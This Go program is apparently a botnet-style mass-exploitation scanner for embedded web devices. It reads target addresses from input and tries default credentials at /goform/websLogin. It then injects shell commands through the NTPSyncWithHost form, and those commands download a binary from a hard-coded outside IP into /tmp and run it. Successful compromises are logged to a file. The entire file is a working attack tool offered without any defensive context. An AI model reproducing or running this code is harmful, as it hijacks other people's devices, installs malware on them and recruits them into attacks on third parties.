package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	port           = os.Args[1]
	protocol       = os.Args[2]
	exploitedMutex sync.Mutex

	conf = &tls.Config{
		InsecureSkipVerify: true,
	}

	wg      sync.WaitGroup
	timeout = 30 * time.Second

	processed uint64
	loggedIn  uint64
	exploited uint64

	logins = []string{"admin:admin", "user:user", "home:home", "installer:installer", "readonly:readonly", "useradmin:useradmin"}

	payloads = []string{
		"wget http://94.156.68.148/cn -O /tmp/cn",
		"chmod 777 /tmp/cn",
		"/tmp/cn",
	}

	exploitedFileName = "done.txt"
)

func writeExploitedToFile(target, login string) {
	exploitedMutex.Lock()
	defer exploitedMutex.Unlock()

	file, err := os.OpenFile(exploitedFileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening exploited file:", err)
		return
	}
	defer file.Close()

	exploitInfo := fmt.Sprintf("%s %s\n", target, login)

	if _, err := file.WriteString(exploitInfo); err != nil {
		fmt.Println("Error writing to exploited file:", err)
	}
}

func findDevice(target string) bool {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}
	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "/index.asp")
}

func loginDevice(target, username, password string) string {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}
	if err != nil {
		return ""
	}

	defer conn.Close()

	data := "user_name=" + username + "&password=" + password
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /goform/websLogin HTTP/1.0\r\nHost: " + target + "\r\nOrigin: " + protocol + "://" + target + "\r\nReferer: " + protocol + "://" + target + "/index.asp\r\nContent-Length: " + cntLen + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	buf := buff.String()

	if strings.Contains(buf, "Set-Cookie") && strings.Contains(buf, "302") {
		cookieStr := strings.Split(buf, "Set-Cookie: ASPSSIONID=")

		if len(cookieStr) > 1 {
			cookie := strings.Split(cookieStr[1], ";")

			if len(cookie) > 0 {
				return cookie[0]
			}
		}
	}

	return ""
}

func sendPayload(target, payload, cookie string) bool {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "$(" + payload + ")"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /goform/NTPSyncWithHost HTTP/1.1\r\nCookie: ASPSSIONID=" + cookie + "\r\nHost: " + target + "\r\nReferer: " + protocol + "://" + target + "/adm/management.asp\r\nOrigin: " + protocol + "://" + target + "\r\nUser-Agent: Hello World\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "n/a")
}

func exploitDevice(target string) {
	processed++
	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	for _, login := range logins {
		username := strings.Split(login, ":")[0]
		password := strings.Split(login, ":")[1]

		cookie := loginDevice(target, username, password)

		if cookie == "" {
			continue
		}

		loggedIn++

		for _, payload := range payloads {
			if !sendPayload(target, payload, cookie) {
				return
			}
		}

		fmt.Printf("%s %s\n", target, login)
		exploited++
		writeExploitedToFile(target, login) // Save exploited information to a file

		return
	}
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Logged In: %d | Exploited: %d\n", processed, loggedIn, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {
		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
